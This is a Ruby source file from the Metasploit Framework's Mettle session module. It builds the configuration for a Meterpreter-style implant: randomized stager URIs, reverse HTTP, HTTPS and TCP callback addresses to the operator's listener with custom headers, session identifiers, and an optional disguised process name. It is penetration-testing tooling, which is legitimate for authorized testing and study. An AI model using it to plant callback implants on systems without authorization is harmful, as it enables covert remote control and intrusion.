# -*- coding: binary -*-

require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'
require 'base64'
require 'securerandom'

module Msf
  module Sessions
    module MettleConfig

      include Msf::Payload::TransportConfig

      def generate_uri(opts={})
        ds = opts[:datastore] || datastore
        uri_req_len = ds['StagerURILength'].to_i

        # Choose a random URI length between 30 and 128 bytes
        if uri_req_len == 0
          uri_req_len = 30 + luri.length + rand(127 - (30 + luri.length))
        end

        if uri_req_len < 5
          raise ArgumentError, "Minimum StagerURILength is 5"
        end

        generate_uri_uuid_mode(:init_connect, uri_req_len, uuid: opts[:uuid])
      end

      def generate_uri_option(opts, opt)
        opts[opt] ? "--#{opt} '#{opts[opt].gsub(/'/, "\\'")}' " : ''
      end

      def generate_http_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end

        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri << luri
        target_uri << generate_uri(opts)
        target_uri << '|'
        target_uri << generate_uri_option(opts, :ua)
        target_uri << generate_uri_option(opts, :host)
        target_uri << generate_uri_option(opts, :referer)
        if opts[:cookie]
          opts[:header] = "Cookie: #{opts[:cookie]}"
          target_uri << generate_uri_option(opts, :header)
        end
        target_uri.strip
      end

      def generate_tcp_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end
        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri
      end

      def generate_config(opts={})
        ds = opts[:datastore] || datastore

        if ds['PayloadProcessCommandLine'] != ''
          opts[:name] ||= ds['PayloadProcessCommandLine']
        end

        if ds['RemoteMeterpreterDebugFile'] != ''
          opts[:log_file] ||= ds['RemoteMeterpreterDebugFile']
        end

        log_level = ds['MeterpreterDebugLevel'].to_i
        log_level = 0 if log_level < 0
        log_level = 3 if log_level > 3
        opts[:debug] = log_level
        opts[:uuid] ||= generate_payload_uuid

        case opts[:scheme]
        when 'http'
          opts[:uri] = generate_http_uri(transport_config_reverse_http(opts))
        when 'https'
          opts[:uri] = generate_http_uri(transport_config_reverse_https(opts))
        when 'tcp'
          opts[:uri] = generate_tcp_uri(transport_config_reverse_tcp(opts))
        else
          raise ArgumentError, "Unknown scheme: #{opts[:scheme]}"
        end

        opts[:uuid] = Base64.encode64(opts[:uuid].to_raw).strip
        guid = "\x00" * 16
        unless opts[:stageless] == true
          guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
        end
        opts[:session_guid] = Base64.encode64(guid).strip

        opts.slice(:uuid, :session_guid, :uri, :debug, :log_file, :name)
      end

      # Stage encoding is not safe for Mettle (doesn't apply to stageless)
      def encode_stage?
        if datastore['EnableStageEncoding'] && !@warned
          print_warning("Stage encoding is not supported for #{refname}")
          @warned = true
        end

        false
      end

    end
  end
end
